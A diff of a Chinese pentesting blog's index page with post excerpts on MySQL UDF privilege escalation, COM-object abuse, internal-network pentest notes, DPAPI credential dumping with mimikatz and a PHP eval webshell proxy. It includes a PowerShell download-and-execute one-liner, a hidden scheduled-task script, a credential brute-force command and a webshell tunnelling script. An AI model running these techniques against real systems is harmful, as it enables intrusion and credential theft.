@@ -117,6 +117,322 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-29  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-14  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
 		</h3>
 		</div>
@@ -287,340 +603,6 @@ my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/04/13/dpapi-pass-dump.html" >通过DPAPI获取windows身份凭证</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-04-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
-<ul>
-<li>IE、Chrome密码登陆表单的自动完成</li>
-<li>邮箱客户端用户密码</li>
-<li>FTP管理账户密码</li>
-<li>远程桌面身份密码</li>
-<li>……</li>
-</ul>
-<p>查找本地的Credentials:<br>通常的保存位置:</p>
-<ul>
-<li><code>%appdata%\Microsoft\Credentials</code></li>
-<li><code>%localappdata%\Microsoft\Credentials</code></li>
-<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
-</ul>
-<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
-<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
-mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">**BLOB**
-  dwVersion          : 00000001 - 1
-  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
-  dwMasterKeyVersion : 00000001 - 1
-  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
-  dwFlags            : 20000000 - 536870912 (system ; )
-  dwDescriptionLen   : 00000012 - 18
-  szDescription      : 本地凭据数据
-
-  algCrypt           : 00006610 - 26128 (CALG_AES_256)
-  dwAlgCryptLen      : 00000100 - 256
-  dwSaltLen          : 00000020 - 32
-  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
-  dwHmacKeyLen       : 00000000 - 0
-  pbHmackKey         : 
-  algHash            : 0000800e - 32782 (CALG_SHA_512)
-  dwAlgHashLen       : 00000200 - 512
-  dwHmac2KeyLen      : 00000020 - 32
-  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
-  dwDataLen          : 00002a70 - 10864
-  pbData             : xxxxxxz
-  dwSignLen          : 00000040 - 64
-  pbSign             : xxxxx
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
-<ul>
-<li>IE、Chrome密码登陆表单的自动完成</li>
-<li>邮箱客户端用户密码</li>
-<li>FTP管理账户密码</li>
-<li>远程桌面身份密码</li>
-<li>……</li>
-</ul>
-<p>查找本地的Credentials:<br>通常的保存位置:</p>
-<ul>
-<li><code>%appdata%\Microsoft\Credentials</code></li>
-<li><code>%localappdata%\Microsoft\Credentials</code></li>
-<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
-</ul>
-<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
-<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
-mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">**BLOB**
-  dwVersion          : 00000001 - 1
-  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
-  dwMasterKeyVersion : 00000001 - 1
-  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
-  dwFlags            : 20000000 - 536870912 (system ; )
-  dwDescriptionLen   : 00000012 - 18
-  szDescription      : 本地凭据数据
-
-  algCrypt           : 00006610 - 26128 (CALG_AES_256)
-  dwAlgCryptLen      : 00000100 - 256
-  dwSaltLen          : 00000020 - 32
-  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
-  dwHmacKeyLen       : 00000000 - 0
-  pbHmackKey         : 
-  algHash            : 0000800e - 32782 (CALG_SHA_512)
-  dwAlgHashLen       : 00000200 - 512
-  dwHmac2KeyLen      : 00000020 - 32
-  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
-  dwDataLen          : 00002a70 - 10864
-  pbData             : xxxxxxz
-  dwSignLen          : 00000040 - 64
-  pbSign             : xxxxx
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-12-13  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>调试的流水账:</p>
-<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
-<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>没毛病就表示安装成功。</p>
-<p>这个pycharm的包一般在这个目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后配置pycharm:</p>
-<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
-
-Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
-
-添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
-
-Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
-	
-	</div>
-  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-10-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-    Elastic, CouchDB, Mongodb, Docker
-
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
-<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
-import socket
-import binascii
-import requests
-
-
-headers &#x3D; &#123;
-&quot;Host&quot;: &quot;&quot;,
-&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
-&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
-&quot;Connection&quot;: &quot;close&quot;
-&#125;
-
-url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((&quot;127.0.0.1&quot;,8889))
-s.listen(5)
-sock, addr_info &#x3D; s.accept()
-
-while True:
-    print &#39;Connect by &#39;, addr_info
-    data &#x3D; sock.recv(102400)
-    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
-    print payload
